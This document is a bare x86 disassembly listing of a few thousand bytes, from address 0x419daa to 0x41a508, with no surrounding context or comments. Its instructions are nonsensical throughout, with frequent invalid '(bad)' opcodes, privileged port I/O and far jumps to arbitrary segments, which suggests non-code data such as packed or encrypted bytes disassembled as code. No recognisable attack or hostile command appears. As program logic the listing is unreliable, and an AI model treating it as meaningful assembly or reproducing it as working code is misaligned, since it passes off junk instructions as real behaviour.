  419daa:	cdq    
  419dab:	std    
  419dac:	repnz ins DWORD PTR es:[edi],dx
  419dae:	lods   al,BYTE PTR ds:[esi]
  419daf:	jnp    0x419df4
  419db1:	not    DWORD PTR ds:0xc6f8c724
  419db7:	sub    ah,0xe3
  419dba:	dec    ebp
  419dbb:	(bad)  
  419dbd:	or     esp,DWORD PTR [edi+0x1e]
  419dc0:	mov    bl,0xc1
  419dc2:	inc    edx
  419dc3:	or     cl,BYTE PTR [ebx+esi*2]
  419dc6:	sbb    ch,0xe0
  419dc9:	sbb    eax,DWORD PTR [ebx+0x72]
  419dcc:	add    DWORD PTR [ebp+esi*2+0x52],edx
  419dd0:	xchg   ebx,eax
  419dd1:	fsubr  QWORD PTR [edi+eiz*2+0x4e58c724]
  419dd8:	fild   DWORD PTR [edx+edx*8+0x26421df5]
  419ddf:	cdq    
  419de0:	mov    al,ds:0x9fc4de22
  419de5:	fist   WORD PTR [ebp+0x5d4bf857]
  419deb:	dec    ebp
  419dec:	in     eax,dx
  419ded:	push   eax
  419dee:	xlat   BYTE PTR ds:[ebx]
  419def:	jge    0x419dcf
  419df1:	into   
  419df2:	mov    ds:0xca01d800,al
  419df7:	xchg   DWORD PTR [ebx],ebx
  419df9:	out    dx,eax
  419dfa:	push   es
  419dfb:	and    dh,BYTE PTR [eax]
  419dfd:	mov    esi,0x1f05209a
  419e02:	mov    ecx,0x97014f18
  419e07:	mov    ds:0x799c47c,al
  419e0c:	call   0xa14a:0xa13ca8df
  419e13:	mov    ebp,DWORD PTR [esi+0x0]
  419e16:	or     eax,0x5254e877
  419e1b:	dec    eax
  419e1c:	bound  ecx,QWORD PTR [esi-0x5d2d3528]
  419e22:	(bad)  
  419e23:	and    edx,edx
  419e25:	push   ebx
  419e26:	or     dl,cl
  419e28:	mov    edx,0x3cd7c50
  419e2d:	nop
  419e2e:	inc    edx
  419e2f:	mov    bl,0xee
  419e31:	push   ebx
  419e32:	int    0xf8
  419e34:	test   eax,0xf12af8c0
  419e39:	jbe    0x419eb4
  419e3b:	lods   al,BYTE PTR ds:[esi]
  419e3c:	xchg   edx,eax
  419e3d:	push   ss
  419e3e:	outs   dx,DWORD PTR ds:[esi]
  419e3f:	jb     0x419e30
  419e41:	lock mov dl,0x95
  419e44:	sbb    eax,0x6e397d2f
  419e49:	adc    bh,ah
  419e4b:	pop    ebp
  419e4c:	je     0x419ea9
  419e4e:	nop
  419e4f:	xchg   edx,eax
  419e50:	pushf  
  419e51:	mov    ch,0x5b
  419e53:	and    eax,0xdde51b74
  419e58:	cwde   
  419e59:	xor    eax,0xd4c361b2
  419e5e:	call   0xf9b9:0x658de7e2
  419e65:	cli    
  419e66:	mov    ecx,0x81e8635d
  419e6b:	cld    
  419e6c:	adc    eax,0x36c0dba
  419e71:	ret    
  419e72:	push   cs
  419e73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e74:	mov    BYTE PTR [ecx],0x4
  419e77:	and    al,bl
  419e79:	into   
  419e7a:	push   0xf021a4e5
  419e7f:	and    eax,0xf57539be
  419e84:	add    BYTE PTR ds:0xe0a1bf2,ch
  419e8a:	jnp    0x419f06
  419e8c:	je     0x419ed5
  419e8e:	ins    DWORD PTR es:[edi],dx
  419e8f:	pushf  
  419e90:	inc    esp
  419e91:	fs (bad) 
  419e93:	push   cs
  419e94:	(bad)  
  419e96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e97:	sub    eax,0xe7d2f103
  419e9c:	popf   
  419e9d:	retf   
  419e9e:	xchg   ebx,eax
  419ea0:	mov    DWORD PTR fs:[edi+ebp*4],esp
  419ea4:	jle    0x419ebd
  419ea6:	jmp    0x1ad0:0x55da869f
  419ead:	dec    ecx
  419eae:	xchg   edx,eax
  419eaf:	jmp    0x419f03
  419eb1:	cs mov esi,0x1b02787c
  419eb7:	xchg   edi,eax
  419eb8:	dec    eax
  419eb9:	push   esp
  419eba:	mov    eax,ds:0xdf7cbc8
  419ebf:	shr    BYTE PTR [eax],1
  419ec1:	shr    ch,1
  419ec3:	mov    edi,DWORD PTR [esi+ebp*8]
  419ec6:	lock xchg edi,eax
  419ec8:	or     al,0x72
  419eca:	js     0x419f30
  419ecc:	xchg   ebp,eax
  419ecd:	xchg   esi,eax
  419ece:	pop    es
  419ecf:	neg    ch
  419ed1:	and    BYTE PTR [eax-0x49d6e208],cl
  419ed7:	cs daa 
  419ed9:	lea    eax,[ecx-0x763a6943]
  419edf:	out    dx,eax
  419ee0:	pop    esp
  419ee1:	or     al,0xc4
  419ee3:	hlt    
  419ee4:	inc    esp
  419ee5:	aad    0x47
  419ee7:	xor    eax,0x8610affc
  419eec:	std    
  419eed:	rcr    DWORD PTR cs:[ecx+0x46074197],cl
  419ef4:	test   BYTE PTR [edx-0x2e],cl
  419ef7:	push   ebp
  419ef8:	lea    ebx,[ecx]
  419efa:	mov    BYTE PTR [edi-0x54],cl
  419efd:	iret   
  419efe:	lods   eax,DWORD PTR es:[esi]
  419f00:	mov    al,ds:0x1f1af07f
  419f05:	js     0x419f37
  419f07:	xchg   ecx,eax
  419f08:	inc    edx
  419f09:	push   ss
  419f0a:	mov    eax,ds:0x5fc867e9
  419f0f:	mov    esp,DWORD PTR [esi+ebp*8-0x79a48d28]
  419f16:	aaa    
  419f17:	je     0x419efd
  419f19:	ins    BYTE PTR es:[edi],dx
  419f1a:	fidivr DWORD PTR [eax+ecx*1-0x21]
  419f1e:	cwde   
  419f1f:	arpl   WORD PTR [ebp+0x3d],bp
  419f22:	aad    0xce
  419f24:	xor    BYTE PTR [esi],al
  419f26:	ja     0x419f65
  419f28:	not    BYTE PTR [esi+eiz*4+0x189351ae]
  419f2f:	and    edx,DWORD PTR [edi+0x53]
  419f32:	pop    ds
  419f33:	pushf  
  419f34:	or     WORD PTR [edi],bp
  419f37:	mov    esi,0x2722246f
  419f3c:	dec    esi
  419f3d:	jmp    DWORD PTR [edi-0x7ea37da2]
  419f43:	fsubr  DWORD PTR gs:[ebx+0x2f]
  419f47:	pop    esp
  419f48:	aas    
  419f49:	imul   eax,DWORD PTR [ebx+0x1e89dfc5],0x60
  419f50:	adc    DWORD PTR [edx-0x1cf88760],eax
  419f56:	mov    ebp,0x81d5b192
  419f5b:	and    esi,edi
  419f5d:	jne    0x419fb7
  419f5f:	nop
  419f60:	xor    esi,ebx
  419f62:	pop    esp
  419f63:	xchg   esp,eax
  419f64:	sub    ecx,DWORD PTR [ecx]
  419f66:	pop    ebx
  419f67:	or     eax,ebx
  419f69:	test   DWORD PTR [ebx+0xd2ef7c6],ebp
  419f6f:	rol    BYTE PTR [edx],1
  419f71:	test   al,0x68
  419f73:	loop   0x419fbd
  419f75:	dec    eax
  419f76:	xchg   esp,eax
  419f77:	cmp    DWORD PTR [esi-0x3b14b809],0xa3f9a89e
  419f81:	inc    edi
  419f82:	cmp    al,0x4
  419f84:	mov    ch,0xca
  419f86:	dec    esp
  419f87:	add    al,0x5e
  419f89:	(bad)  
  419f8a:	adc    bh,BYTE PTR [edx-0x14]
  419f8d:	aaa    
  419f8e:	inc    eax
  419f8f:	sbb    al,0x87
  419f91:	add    bh,ch
  419f93:	push   cs
  419f94:	ficomp WORD PTR [eax]
  419f96:	jb     0x419f39
  419f98:	jecxz  0x419f49
  419f9a:	inc    ebp
  419f9b:	jmp    0x419f54
  419f9d:	outs   dx,DWORD PTR ds:[esi]
  419f9e:	cdq    
  419f9f:	dec    ebx
  419fa0:	dec    edx
  419fa1:	cmp    esi,DWORD PTR [ecx-0x4ba5317f]
  419fa7:	add    bl,BYTE PTR [edx-0x333f2685]
  419fad:	loop   0x419f9e
  419faf:	leave  
  419fb0:	pop    ebx
  419fb1:	ja     0x419f6b
  419fb3:	push   ss
  419fb4:	gs push ebx
  419fb6:	jle    0x41a021
  419fb8:	call   0x92482dd3
  419fbd:	lds    ebx,FWORD PTR [edi-0x1f659e56]
  419fc3:	test   DWORD PTR [esi+0x1a],0xbfb90193
  419fca:	pop    edi
  419fcb:	in     eax,0x88
  419fcd:	sti    
  419fce:	mov    cl,0x6a
  419fd0:	cdq    
  419fd1:	das    
  419fd2:	aad    0x80
  419fd4:	daa    
  419fd5:	fist   WORD PTR [ebx-0x19057276]
  419fdb:	add    BYTE PTR [edx-0x6e],dl
  419fde:	sub    BYTE PTR [ecx*2+0x3d44f01e],al
  419fe5:	lock cmp eax,0x951c9cd1
  419feb:	mov    al,0x4e
  419fed:	pop    esp
  419fee:	clc    
  419fef:	xlat   BYTE PTR ds:[ebx]
  419ff0:	pop    ss
  419ff1:	rol    ah,1
  419ff3:	cld    
  419ff4:	clc    
  419ff5:	les    ebx,FWORD PTR [ebx+0x4eb11ee0]
  419ffb:	mov    al,0x50
  419ffd:	loopne 0x419fda
  419fff:	into   
  41a000:	fdivr  QWORD PTR [edi]
  41a002:	push   ecx
  41a003:	loop   0x419ffc
  41a005:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a006:	sbb    eax,0xdd7ea079
  41a00b:	pusha  
  41a00c:	xor    BYTE PTR [edx],dh
  41a00e:	add    cl,BYTE PTR [edx-0x43cab61f]
  41a014:	and    dl,BYTE PTR [ecx-0x70]
  41a017:	sbb    BYTE PTR [ecx-0x18e12df1],bh
  41a01d:	mov    edx,ebx
  41a01f:	jno    0x41a012
  41a021:	xor    edx,ebp
  41a023:	out    dx,al
  41a024:	sub    al,0x2
  41a026:	add    al,0xb4
  41a028:	add    eax,0xb0172dc6
  41a02d:	loop   0x41a0a1
  41a02f:	sbb    BYTE PTR [edx],0x9f
  41a032:	dec    edx
  41a033:	aam    0x4a
  41a035:	daa    
  41a036:	lods   eax,DWORD PTR ds:[esi]
  41a037:	and    BYTE PTR [ecx+0x4c9124d3],cl
  41a03d:	lods   eax,DWORD PTR ds:[esi]
  41a03e:	mov    bl,0x7d
  41a040:	dec    esp
  41a041:	add    BYTE PTR [ecx],0xa6
  41a044:	jb     0x41a038
  41a046:	or     ch,BYTE PTR [esi]
  41a048:	mov    dh,0xdb
  41a04a:	test   al,0xc
  41a04c:	dec    eax
  41a04d:	shl    edi,cl
  41a04f:	xor    DWORD PTR [edi+0x15],ecx
  41a052:	cmp    ebp,DWORD PTR [ebx]
  41a054:	(bad)  
  41a055:	cmp    bl,BYTE PTR ds:0xd32ec272
  41a05b:	jb     0x41a05c
  41a05d:	in     al,0x49
  41a05f:	dec    edi
  41a060:	pop    es
  41a061:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a062:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a063:	mov    WORD PTR [esi],cs
  41a065:	jmp    0xb87065b5
  41a06a:	out    0x42,eax
  41a06c:	sbb    ch,BYTE PTR [edx]
  41a06e:	cmp    dl,BYTE PTR [ebp+0x29]
  41a071:	imul   edx,DWORD PTR [ecx-0x33c0dbdb],0xffffff90
  41a078:	je     0x41a081
  41a07a:	scas   al,BYTE PTR es:[edi]
  41a07b:	call   0xdd36:0xae250bda
  41a082:	pop    es
  41a083:	or     eax,DWORD PTR ds:0xbe840de0
  41a089:	xor    al,0x51
  41a08b:	loopne 0x41a051
  41a08d:	inc    esp
  41a08e:	mov    eax,0xe21fe9a0
  41a093:	dec    esp
  41a094:	outs   dx,BYTE PTR ds:[esi]
  41a095:	sti    
  41a096:	retf   0x6cf
  41a099:	push   cs
  41a09a:	call   0x9e925f2e
  41a09f:	(bad)  
  41a0a0:	fadd   QWORD PTR [esi-0x43]
  41a0a3:	nop
  41a0a4:	push   ss
  41a0a5:	je     0x41a076
  41a0a7:	out    0x53,al
  41a0a9:	out    dx,eax
  41a0aa:	mov    dl,0xfc
  41a0ac:	push   esp
  41a0ad:	push   ds
  41a0ae:	sbb    al,0x64
  41a0b0:	adc    dl,BYTE PTR [ebp+0x1d626206]
  41a0b6:	es xor eax,0xd11874c1
  41a0bc:	xor    cl,BYTE PTR [esp+eax*8]
  41a0bf:	mov    edx,DWORD PTR [edi+eiz*1]
  41a0c2:	imul   edx,DWORD PTR [ecx-0x2f],0xffffffcb
  41a0c6:	call   0xf99:0xc96587e8
  41a0cd:	mov    eax,0xfece1eae
  41a0d2:	jnp    0x41a0c5
  41a0d4:	mov    edi,0xb48b7298
  41a0d9:	ss jecxz 0x41a0d0
  41a0dc:	push   ds
  41a0dd:	std    
  41a0de:	jae    0x41a0b6
  41a0e0:	jecxz  0x41a075
  41a0e2:	and    eax,0x2c55862a
  41a0e7:	mov    ch,cl
  41a0e9:	call   0x4ebb5ff
  41a0ee:	retfw  0x8760
  41a0f2:	out    0xaf,al
  41a0f4:	bound  ebx,QWORD PTR [edx]
  41a0f6:	xchg   ebp,eax
  41a0f7:	xchg   ecx,eax
  41a0f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0f9:	jmp    0xff52:0x187b39ad
  41a100:	int3   
  41a101:	(bad)  
  41a102:	jge    0x41a0dd
  41a104:	sub    BYTE PTR [esi],bl
  41a106:	mov    ds:0xdc6f0874,al
  41a10b:	mov    ah,0xd4
  41a10d:	fs aaa 
  41a10f:	js     0x41a0df
  41a111:	(bad)  
  41a112:	(bad)  
  41a113:	jg     0x41a104
  41a115:	mov    DWORD PTR [edx+edx*8],edx
  41a118:	cmp    eax,0xa79af435
  41a11d:	and    al,0xb2
  41a11f:	sub    al,BYTE PTR [esi]
  41a121:	cmp    BYTE PTR [ecx+0x42fa52e2],0x82
  41a128:	lods   eax,DWORD PTR ds:[esi]
  41a129:	test   DWORD PTR [eax-0x63],ebp
  41a12c:	or     al,0x6
  41a12e:	rol    DWORD PTR [ecx],1
  41a130:	in     al,dx
  41a131:	jp     0x41a116
  41a133:	pop    esi
  41a134:	scas   eax,DWORD PTR es:[edi]
  41a135:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a136:	add    BYTE PTR [edx+0x56e2be43],dh
  41a13c:	add    ebx,DWORD PTR [edi-0x18]
  41a13f:	loop   0x41a15b
  41a141:	xchg   esi,eax
  41a142:	sbb    eax,0x9589e132
  41a147:	pushf  
  41a148:	ret    
  41a149:	or     dl,0xf
  41a14c:	mov    ds,WORD PTR [ecx]
  41a14e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a14f:	dec    ebp
  41a150:	cs push eax
  41a152:	add    ebx,DWORD PTR [ebx+edi*1]
  41a155:	push   cs
  41a156:	shl    BYTE PTR [esp+eax*8],0x6a
  41a15a:	scas   al,BYTE PTR es:[edi]
  41a15b:	test   al,0xdf
  41a15d:	outs   dx,BYTE PTR ds:[esi]
  41a15e:	jbe    0x41a1d9
  41a160:	test   ch,cl
  41a162:	popf   
  41a163:	loop   0x41a125
  41a165:	sbb    eax,0xf3742a89
  41a16a:	idiv   dl
  41a16c:	or     BYTE PTR [ebp+0x73],0x2c
  41a170:	push   ss
  41a171:	add    BYTE PTR [ebp-0x5083b62d],ch
  41a177:	xor    esi,ebp
  41a179:	call   0xe064f532
  41a17e:	inc    cl
  41a180:	cmp    ebp,DWORD PTR [esi+0x52]
  41a183:	inc    ebx
  41a184:	cmp    dh,dh
  41a186:	aaa    
  41a187:	mov    eax,ds:0x9ebf4c4
  41a18c:	jl     0x41a122
  41a18e:	pop    edi
  41a18f:	inc    ebx
  41a190:	add    ebx,DWORD PTR [ecx-0x1]
  41a193:	int3   
  41a194:	mov    cl,BYTE PTR [ebp+0x74]
  41a197:	xchg   DWORD PTR [edx-0x437d1f2c],eax
  41a19d:	and    cl,al
  41a19f:	pop    esi
  41a1a0:	test   eax,0xb87c4270
  41a1a5:	xchg   DWORD PTR ds:0xc4496619,ebp
  41a1ab:	(bad)  
  41a1ac:	xor    DWORD PTR [eax],ebx
  41a1ae:	aam    0xa0
  41a1b0:	pusha  
  41a1b1:	or     dl,ch
  41a1b3:	push   cs
  41a1b4:	into   
  41a1b5:	adc    al,BYTE PTR ss:[ebx]
  41a1b8:	cld    
  41a1b9:	shl    DWORD PTR [esi],cl
  41a1bb:	and    BYTE PTR [ecx],bh
  41a1bd:	jl     0x41a1df
  41a1bf:	or     eax,0x6380d06e
  41a1c4:	std    
  41a1c5:	dec    BYTE PTR [ecx+edx*8]
  41a1c8:	inc    ebx
  41a1c9:	in     eax,0x57
  41a1cb:	aas    
  41a1cc:	jbe    0x41a1b6
  41a1ce:	add    BYTE PTR [esi-0x1a],0x7c
  41a1d2:	add    eax,0x8fc28db8
  41a1d7:	xchg   edx,eax
  41a1d8:	inc    ebx
  41a1d9:	pop    es
  41a1da:	outs   dx,DWORD PTR ds:[esi]
  41a1db:	(bad)  
  41a1dd:	lods   eax,DWORD PTR ds:[esi]
  41a1de:	jg     0x41a186
  41a1e0:	dec    esp
  41a1e1:	mov    ebp,0x67c3c857
  41a1e6:	and    ah,dh
  41a1e8:	ja     0x41a1be
  41a1ea:	iret   
  41a1eb:	and    eax,0xf09b9d0d
  41a1f0:	fisub  DWORD PTR [ebx]
  41a1f2:	and    BYTE PTR [edi+edx*8],bh
  41a1f5:	and    esp,DWORD PTR [edi+0x3a]
  41a1f8:	pop    esp
  41a1f9:	call   0xc5313976
  41a1fe:	frstor [ebx-0x2a]
  41a201:	ret    
  41a202:	leave  
  41a203:	mov    dh,0x6
  41a205:	cdq    
  41a206:	out    dx,al
  41a207:	add    BYTE PTR ds:0x339c2097,bh
  41a20d:	jl     0x41a1fb
  41a20f:	les    esi,FWORD PTR [ecx-0x46298076]
  41a215:	xchg   ebx,esp
  41a217:	popf   
  41a218:	loope  0x41a264
  41a21a:	out    0x3b,eax
  41a21c:	shl    BYTE PTR [esi],cl
  41a21e:	and    BYTE PTR ds:0xf990a8c6,0x12
  41a225:	push   eax
  41a226:	mov    edx,0xddf4f8cb
  41a22b:	stc    
  41a22c:	repnz popf 
  41a22e:	(bad)  
  41a22f:	fcmovnu st,st(4)
  41a231:	ins    DWORD PTR es:[edi],dx
  41a232:	imul   ecx,DWORD PTR [edi+ebx*4],0x13
  41a236:	rcl    BYTE PTR [ecx-0x53],cl
  41a239:	mov    eax,0x2a509fad
  41a23e:	push   esi
  41a23f:	push   ecx
  41a240:	bound  esi,QWORD PTR [ebx+0x8d4591a]
  41a246:	dec    ebp
  41a247:	loope  0x41a1df
  41a249:	ret    0x15da
  41a24c:	mov    esp,0xcb79129b
  41a251:	sub    al,0x21
  41a253:	fistp  QWORD PTR [esi]
  41a255:	lahf   
  41a256:	or     al,0x97
  41a258:	daa    
  41a259:	fist   WORD PTR [eax-0x14]
  41a25c:	enter  0x5d5,0x9d
  41a260:	or     al,BYTE PTR [edx-0x16]
  41a263:	and    DWORD PTR ds:0x797128c0,0x53
  41a26a:	outs   dx,BYTE PTR ds:[esi]
  41a26b:	sti    
  41a26c:	push   es
  41a26d:	sbb    ah,BYTE PTR [edx+0x4e]
  41a270:	out    dx,eax
  41a271:	xor    cl,dl
  41a273:	(bad)  
  41a274:	dec    ebp
  41a275:	inc    ecx
  41a276:	pushf  
  41a277:	mov    cl,0xcd
  41a279:	fisub  DWORD PTR [edi-0x4208ad1f]
  41a27f:	mov    ch,0x76
  41a281:	cdq    
  41a282:	sbb    DWORD PTR [eax],ebx
  41a284:	dec    ecx
  41a285:	adc    DWORD PTR [ecx],ebp
  41a287:	div    BYTE PTR [ebp-0xde1c334]
  41a28d:	ficom  DWORD PTR [eax]
  41a28f:	stc    
  41a290:	enter  0x8b24,0x77
  41a294:	movd   DWORD PTR ds:0x861bc16,mm6
  41a29b:	rol    ebx,cl
  41a29d:	out    0x79,al
  41a29f:	shl    DWORD PTR [eax],0xb9
  41a2a2:	xor    DWORD PTR [esi-0x321a5907],eax
  41a2a8:	inc    esp
  41a2a9:	call   0x692d0bdc
  41a2ae:	pop    eax
  41a2af:	mov    bl,0x4
  41a2b1:	repz and al,0xac
  41a2b4:	dec    esp
  41a2b5:	mov    ah,0xe
  41a2b7:	or     BYTE PTR [ebp+0x3b],cl
  41a2ba:	xor    BYTE PTR [ebp-0x7a],bh
  41a2bd:	mov    ecx,0x56549134
  41a2c2:	std    
  41a2c3:	ret    0x7d0c
  41a2c6:	ds je  0x41a2b0
  41a2c9:	adc    cl,dh
  41a2cb:	sar    DWORD PTR [edx],cl
  41a2cd:	outs   dx,DWORD PTR ds:[esi]
  41a2ce:	int    0xd5
  41a2d0:	jecxz  0x41a2e7
  41a2d2:	ds (bad) 
  41a2d4:	mov    ds:0x33933f53,eax
  41a2d9:	mov    ds:0x5cf88f28,eax
  41a2de:	cli    
  41a2df:	mov    eax,0x5ba2ba91
  41a2e4:	jns    0x41a28b
  41a2e6:	jle    0x41a28d
  41a2e8:	aam    0x36
  41a2ea:	pusha  
  41a2eb:	xchg   ecx,eax
  41a2ec:	or     cl,BYTE PTR es:[ebx]
  41a2ef:	sbb    bh,BYTE PTR [edx]
  41a2f1:	cwde   
  41a2f2:	sbb    ah,BYTE PTR [eax-0xa6cc7b]
  41a2f8:	jle    0x41a2ad
  41a2fa:	mov    cl,0x85
  41a2fc:	push   esi
  41a2fd:	addr16 xor eax,0x13b070d9
  41a303:	inc    edx
  41a304:	mov    bh,0x79
  41a306:	(bad)
  41a30a:	mov    ecx,0xa909d077
  41a30f:	ffree  st(3)
  41a311:	adc    eax,0x1390e03f
  41a316:	pop    ss
  41a317:	sub    eax,0x3107806e
  41a31c:	push   edx
  41a31d:	sub    ebx,ebx
  41a31f:	xor    edx,DWORD PTR [edx-0x3e]
  41a322:	xchg   edx,eax
  41a323:	(bad)  [esi+edx*4]
  41a326:	xchg   ebx,eax
  41a327:	cmp    al,BYTE PTR [ebp+0x30c666c4]
  41a32d:	sbb    ebx,DWORD PTR [esi]
  41a32f:	mov    ds,WORD PTR [esi+0x2d]
  41a332:	xor    ebx,DWORD PTR [edi+0x74ddd123]
  41a338:	out    0xdf,al
  41a33a:	sbb    DWORD PTR [ecx],0x2f
  41a33d:	addr16 jno 0x41a2cd
  41a340:	mov    bh,al
  41a342:	lods   eax,DWORD PTR ds:[esi]
  41a343:	inc    ebx
  41a344:	xor    ah,bh
  41a346:	cmp    bl,BYTE PTR [ebp-0xaf7c9fa]
  41a34c:	or     edi,DWORD PTR [ebx]
  41a34e:	xchg   edi,eax
  41a34f:	sbb    al,0x16
  41a351:	mov    WORD PTR [edx+edx*1+0x2d],es
  41a355:	push   esp
  41a356:	jl     0x41a370
  41a358:	int3   
  41a359:	sbb    ecx,ebp
  41a35b:	adc    ecx,DWORD PTR ds:[ecx]
  41a35e:	sahf   
  41a35f:	push   esi
  41a360:	mov    bh,BYTE PTR [ecx]
  41a362:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a363:	xchg   esi,eax
  41a364:	xor    bl,cl
  41a366:	mov    ds:0x10824194,eax
  41a36b:	fcom   QWORD PTR [edi]
  41a36d:	xchg   ecx,eax
  41a36e:	jbe    0x41a3c0
  41a370:	sbb    eax,0xfd640588
  41a375:	(bad)  
  41a376:	cdq    
  41a377:	jb     0x41a3f1
  41a379:	in     al,dx
  41a37a:	xchg   ecx,eax
  41a37b:	dec    ebp
  41a37c:	lods   eax,DWORD PTR ds:[esi]
  41a37d:	in     eax,dx
  41a37e:	pushf  
  41a37f:	cmp    al,0x2d
  41a381:	call   0x66bf:0x1b40f216
  41a388:	mov    ch,0x72
  41a38a:	push   es
  41a38b:	imul   DWORD PTR [esi+eax*8]
  41a38e:	mov    ds:0x26a1d9c,eax
  41a393:	pop    edx
  41a394:	loope  0x41a329
  41a396:	icebp  
  41a397:	cmp    ebp,ebp
  41a399:	retf   
  41a39a:	ficom  DWORD PTR [edx+0x6]
  41a39d:	adc    cl,BYTE PTR [ebx+edx*1+0x56]
  41a3a1:	repnz cli 
  41a3a3:	shl    BYTE PTR [edx+0x7fb71c10],0x7b
  41a3aa:	mov    es,WORD PTR [ebx]
  41a3ac:	jne    0x41a3b7
  41a3ae:	out    0xd8,eax
  41a3b0:	adc    BYTE PTR [esi-0x688dade7],0xe0
  41a3b7:	mov    ecx,0xc1db96ac
  41a3bc:	inc    ebp
  41a3bd:	or     ah,bl
  41a3bf:	inc    ebx
  41a3c0:	mov    ah,0x8c
  41a3c2:	les    edi,FWORD PTR [ebx]
  41a3c4:	xchg   BYTE PTR [ebp+0x62a2aea5],dh
  41a3ca:	mov    bh,0x9d
  41a3cc:	leave  
  41a3cd:	cmp    dl,ch
  41a3cf:	cs fs add dl,dh
  41a3d3:	sbb    edi,esp
  41a3d5:	push   ss
  41a3d6:	fcomip st,st(5)
  41a3d8:	shr    ch,0x62
  41a3db:	stos   DWORD PTR es:[edi],eax
  41a3dc:	(bad)  
  41a3dd:	adc    BYTE PTR [eax-0x508760d1],cl
  41a3e3:	push   esi
  41a3e4:	pop    es
  41a3e5:	adc    ebp,eax
  41a3e7:	repnz add ch,BYTE PTR [edx+0x72]
  41a3eb:	mov    ebx,0x6ca8df97
  41a3f0:	dec    ebp
  41a3f1:	adc    edx,edi
  41a3f3:	retf   
  41a3f4:	lock (bad) 
  41a3f6:	or     ch,BYTE PTR [edx+edx*1-0x51]
  41a3fa:	or     al,0xe6
  41a3fc:	shr    BYTE PTR [ecx-0x74],cl
  41a3ff:	std    
  41a400:	lahf   
  41a401:	dec    ecx
  41a402:	push   ds
  41a403:	aam    0x5e
  41a405:	jmp    0x41a46b
  41a407:	rol    DWORD PTR [ebp+edi*2+0x21],1
  41a40b:	adc    eax,0x87a37b6f
  41a410:	mov    bh,0xaa
  41a412:	mov    esp,0xd7616784
  41a417:	aam    0xdf
  41a419:	pop    ecx
  41a41a:	mov    dh,0xa9
  41a41c:	pop    si
  41a41e:	push   edx
  41a41f:	(bad)  
  41a420:	cmp    DWORD PTR [ebx],ecx
  41a422:	sahf   
  41a423:	hlt    
  41a424:	je     0x41a4a2
  41a426:	sbb    ebx,DWORD PTR [ebp+0x4]
  41a429:	scas   eax,DWORD PTR es:[edi]
  41a42a:	jp     0x41a40f
  41a42c:	jge    0x41a3e6
  41a42e:	jo     0x41a419
  41a430:	jmp    0xbe72:0xaabed3e9
  41a437:	mov    dh,0x99
  41a439:	pop    edi
  41a43a:	adc    cl,BYTE PTR [edi]
  41a43c:	fist   WORD PTR [ecx+eiz*2+0x41]
  41a440:	pop    ds
  41a441:	xor    al,BYTE PTR [ebx-0x5df2952e]
  41a447:	xor    ebx,ecx
  41a449:	mov    ebx,0x995785d2
  41a44e:	out    dx,eax
  41a44f:	or     esi,DWORD PTR ds:0x84a9621e
  41a455:	adc    bh,BYTE PTR [ebp-0x61]
  41a458:	aam    0x28
  41a45a:	aaa    
  41a45b:	sub    ebx,DWORD PTR [bx+si+0x18]
  41a45f:	ja     0x41a4ae
  41a461:	into   
  41a462:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a463:	jg     0x41a423
  41a465:	ins    DWORD PTR es:[edi],dx
  41a466:	push   ecx
  41a467:	mov    edi,esp
  41a469:	pusha  
  41a46a:	fdivrp st(2),st
  41a46c:	xchg   edx,eax
  41a46d:	pop    ebp
  41a46e:	pop    ebp
  41a46f:	stos   BYTE PTR es:[edi],al
  41a470:	or     edi,DWORD PTR [ebx-0x7e56e6de]
  41a476:	retf   
  41a477:	ss jns 0x41a44b
  41a47a:	mov    al,0x64
  41a47c:	xlat   BYTE PTR ds:[ebx]
  41a47d:	inc    edi
  41a47e:	out    dx,al
  41a47f:	sub    DWORD PTR [esi+0x77],ecx
  41a482:	jmp    0x41a4e8
  41a484:	jmp    0x41a47c
  41a486:	(bad)  
  41a487:	(bad)  
  41a488:	mov    esp,0xb3fe30a5
  41a48d:	lds    edi,FWORD PTR [eax-0x10]
  41a490:	sbb    DWORD PTR [edx+0x7f65352e],ebx
  41a496:	pop    eax
  41a497:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a498:	icebp  
  41a499:	dec    BYTE PTR [edi]
  41a49b:	or     eax,0xbfa922e6
  41a4a0:	dec    esi
  41a4a1:	cwde   
  41a4a2:	leave  
  41a4a3:	ja     0x41a4b9
  41a4a5:	ds test al,0xfd
  41a4a8:	imul   ecx,DWORD PTR [ebx+0x49],0x93bc810b
  41a4af:	xchg   ebx,eax
  41a4b0:	sub    dl,ah
  41a4b2:	xor    BYTE PTR [ecx-0x5ae879d4],dl
  41a4b8:	pop    ss
  41a4b9:	std    
  41a4ba:	hlt    
  41a4bb:	ins    BYTE PTR es:[edi],dx
  41a4bc:	jmp    0x41a48b
  41a4be:	mov    bl,0x1d
  41a4c0:	push   ebx
  41a4c1:	mov    dl,0xc8
  41a4c3:	arpl   WORD PTR [ebx+0x8ad0c53],ax
  41a4c9:	mov    ebp,0xd45875d5
  41a4ce:	fbld   TBYTE PTR [esi]
  41a4d0:	jmp    0x2783:0x3e32b725
  41a4d7:	xchg   edx,eax
  41a4d8:	push   ss
  41a4d9:	mov    eax,0xb8827ad7
  41a4de:	(bad)  
  41a4df:	repz inc ebp
  41a4e1:	pop    ebp
  41a4e2:	sbb    DWORD PTR [eax+0x57],ebp
  41a4e5:	cmc    
  41a4e6:	ins    DWORD PTR es:[edi],dx
  41a4e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4e8:	or     al,0xf9
  41a4ea:	(bad)
  41a4ed:	xchg   ah,cl
  41a4ef:	dec    esp
  41a4f0:	icebp  
  41a4f1:	jbe    0x41a48f
  41a4f3:	shr    DWORD PTR [eax],1
  41a4f5:	jecxz  0x41a4e2
  41a4f7:	jp     0x41a4e2
  41a4f9:	fadd   QWORD PTR [ebx+ecx*8]
  41a4fc:	ins    BYTE PTR es:[edi],dx
  41a4fd:	ds je  0x41a491
  41a500:	cmp    al,0x16
  41a502:	push   ds
  41a503:	and    al,0xa7
  41a505:	sub    esp,DWORD PTR [edx-0x76]
  41a508:	jns    0x41a4bd
